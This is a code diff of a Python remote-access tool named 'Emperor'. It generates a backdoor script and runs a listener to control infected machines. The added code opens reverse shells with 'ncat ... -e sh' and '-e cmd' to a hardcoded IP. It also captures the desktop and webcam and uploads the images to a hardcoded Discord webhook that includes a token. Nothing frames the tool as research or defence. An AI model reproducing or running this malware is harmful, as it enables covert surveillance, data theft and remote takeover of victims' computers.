@@ -51,9 +51,9 @@ EMPEROR_MENU_BANNER = ("""
  \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [Emperor] software commands                           ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mbackdoor\033[0m       \033[97;1mGenerate a backdoor '.py' file                                    ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mngrok\033[0m          \033[97;1mDeploy a remote server to carry out our attacks                   ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mlistener\033[0m       \033[97;1mStart the [listener] tool                                 ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mlistener\033[0m       \033[97;1mStart the [listener] tool                                         ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mbanner\033[0m         \033[97;1mDisplay software banner                                           ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [Emperor] software                                         ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [Emperor] software                                      ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [Emperor] software                                           ║\033[0m
  \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
 """)
@@ -61,7 +61,10 @@ EMPEROR_MENU_BANNER = ("""
 LISTENER_MENU_BANNER = ("""
  \033[97;1m╔═══[COMMAND]══════[DESCRIPTION]══════════════════════════════════════════════════════╗\033[0m
  \033[97;1m║>>>\033[0m \033[91mhelp\033[0m           \033[97;1mDisplay all [listener] tool commands                              ║\033[0m
- \033[97;1m║>>>\033[0m \033[91mipinfo  \033[0m       \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mzombie -linux\033[0m  \033[97;1mStart zombie mode on the target machine Linux                     ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mzombie -windows\033[0m\033[97;1mStart zombie mode on the target machine Windows                   ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mipinfo\033[0m         \033[97;1mObtain all the IP address information of the target machine       ║\033[0m
+ \033[97;1m║>>>\033[0m \033[91mscreenshot\033[0m     \033[97;1mObtain the screenshot of the target machine webcam                ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mreset\033[0m          \033[97;1mReset the [listener] tool                                         ║\033[0m
  \033[97;1m║>>>\033[0m \033[91mleave\033[0m          \033[97;1mQuit [listener] tool                                              ║\033[0m
  \033[97;1m╚═════════════════════════════════════════════════════════════════════════════════════╝\033[0m
@@ -78,7 +81,7 @@ def TEXT_DELAY(TEXT, DELAY):
 def BACKDOOR():
     LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
     LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
-    print(" \033[97;1m[...] Backdoor generation in '.exe' file in progress...\033[0m")
+    print(" \033[97;1m[\033[38;5;208m...\033[0m] Backdoor generation in '.exe' file in progress...\033[0m")
     time.sleep(2)
 
     with open("backdoor/backdoor.py", "w") as file:
@@ -87,12 +90,15 @@ import os
 import time
 import socket
 import requests
+import discord
+import pyautogui
+import cv2
 import subprocess
 
 
 def MALWARE():
-    LHOST = "{LHOST}"
-    LPORT = {LPORT}
+    LHOST = "192.168.1.26"
+    LPORT = 833
 
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     SOCKET.connect((LHOST, LPORT))
@@ -100,12 +106,41 @@ def MALWARE():
     while True:
         MALWARE_RECV = SOCKET.recv(8000).decode()
         
-        if MALWARE_RECV.lower() == 'ipinfo':
+        if MALWARE_RECV == "zombie -linux":
+           os.system("ncat 192.168.1.26 834 -e sh")
+           
+        if MALWARE_RECV == "zombie -windows":
+           os.system("ncat 192.168.1.26 835 -e cmd")
+        
+        if MALWARE_RECV == "ipinfo":
            IPINFO = requests.get("https://ipinfo.io/json")
            SOCKET.send(IPINFO.text.encode())
+           
+        if MALWARE_RECV == "screenshot":
+           IMAGE_DESKTOP = pyautogui.screenshot()
+           IMAGE_DESKTOP.save("WEBCAM.jpg")
 
-        if MALWARE_RECV == "exit":
-           break
+           WEBCAM = cv2.VideoCapture(0)
+
+           RET, FRAME = WEBCAM.read()
+
+           WEBCAM.release()
+
+           cv2.imwrite("WEBCAM.jpg", FRAME)
+
+           with open("WEBCAM.jpg", "rb") as IMAGE:
+                IMAGE.read()
+                
+           WEBHOOK = "https://discord.com/api/webhooks/1165737675635036200/jnvMkGQnYcEHQ1fjuAFKxfwCkNM729umhnG4n_0t8he2bOkiKGbsayb6mo0EpYKzTymK"
+           FILES = {"file1": open("WEBCAM.jpg", "rb")}
+           DATA = {
+               "username": "Сидиус",
+               "avatar_url":"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Sith_Emblem_(Star_Wars).svg/langfr-280px-Sith_Emblem_(Star_Wars).svg.png"
+           }
+           RESPONSE = requests.post(WEBHOOK, data=DATA, files=FILES)        
+
+        if MALWARE_RECV == "leave":
+           os._exit(0)
 
            OUTPUT = subprocess.Popen(MALWARE_RECV, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            RESULT = OUTPUT.stdout.read() + OUTPUT.stderr.read()
@@ -136,10 +171,10 @@ def LISTENER():
     SOCKET.bind((LHOST, int(LPORT)))
     SOCKET.listen(10000)
 
-    print("[...] Waiting for the target machine to connect...")
+    print(" \033[97;1m[\033[38;5;208m...\033[0m] Waiting for the target machine to connect...\033[0m")
 
     CONN, ADDR = SOCKET.accept()
-    print("[...] Connection established from > ", ADDR)
+    print(" \033[97;1m[\033[38;5;208m...\033[0m] Connection established from >\033[0m", ADDR)
 
     while True:
         print("")
@@ -149,24 +184,43 @@ def LISTENER():
         LISTENER_INPUT = input()
         
         if LISTENER_INPUT == "help":
-           print(" \033[97;1m[...] Watching all [listener] tool commands...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Watching all [listener] tool commands...\033[0m")
            time.sleep(2)
            TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
            time.sleep(10)
            LISTENER() 
            
+        if LISTENER_INPUT == "zombie -linux":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Linux...\033[0m")
+           time.sleep(2)
+           CONN.send("zombie -linux".encode())
+           os.system("ncat -lvnp 834")
+           
+        if LISTENER_INPUT == "zombie -windows":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting zombie mode on the target machine Windows...\033[0m")
+           time.sleep(2)
+           CONN.send("zombie -windows".encode())
+           os.system("ncat -lvnp 835")
+           
         if LISTENER_INPUT == "ipinfo":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the IP address information of the target machine...\033[0m")
+           time.sleep(2)
            CONN.send("ipinfo".encode())
            IPINFO = CONN.recv(8000).decode()
            print(IPINFO)
            
+        if LISTENER_INPUT == "screenshot":
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Obtaining the screenshot of the target machine webcam...\033[0m")
+           time.sleep(2)
+           CONN.send("screenshot".encode())
+           
         if LISTENER_INPUT == "reset":
-           print(" \033[97;1m[...] Reset the [listener] tool...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Reset the [listener] tool...\033[0m")
            time.sleep(2)
            LISTENER()        
 
-        if LISTENER_INPUT == "exit":
-           CONN.send("exit".encode())
+        if LISTENER_INPUT == "leave":
+           CONN.send("leave".encode())
            EMPEROR()
 
     CONN.close()
@@ -187,59 +241,42 @@ def EMPEROR():
         EMPEROR_INPUT = input()
         
         if EMPEROR_INPUT == "help":
-           print(" \033[97;1m[...] Watching all [Emperor] software commands...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Watching all [Emperor] software commands...\033[0m")
            time.sleep(2)
            TEXT_DELAY(EMPEROR_MENU_BANNER, 0.0005)
            time.sleep(10)
            EMPEROR()
            
         if EMPEROR_INPUT == "backdoor":
-           print(" \033[97;1m[...] Starting [backdoor] in progress...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [backdoor] in progress...\033[0m")
            time.sleep(2)
            BACKDOOR()
            
         if EMPEROR_INPUT == "ngrok":
-           print(" \033[97;1m[...] Starting [ngrok] in progress...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [ngrok] in progress...\033[0m")
            time.sleep(2)
            NGROK()
            
         if EMPEROR_INPUT == "listener":
-           print(" \033[97;1m[...] Starting [listener] in progress...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Starting [listener] in progress...\033[0m")
            time.sleep(2)
            LISTENER()
         
         if EMPEROR_INPUT == "banner":
-           print(" \033[97;1m[...] Display the [Emperor] software banner...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Display the [Emperor] software banner...\033[0m")
            time.sleep(2)
            TEXT_DELAY(DRAC_LOGO_BANNER, 0.0005)
            time.sleep(5)
            EMPEROR()
            
         if EMPEROR_INPUT == "reset":
-           print(" \033[97;1m[...] Reset the [Emperor] software...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Reset the [Emperor] software...\033[0m")
            time.sleep(2)
            EMPEROR()
         
         if EMPEROR_INPUT == "leave":
-           print(" \033[97;1m[...] Quit the [Emperor] software...\033[0m")
+           print(" \033[97;1m[\033[38;5;208m...\033[0m] Quit the [Emperor] software...\033[0m")
            time.sleep(2)
            os._exit(0)
     
 EMPEROR()
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
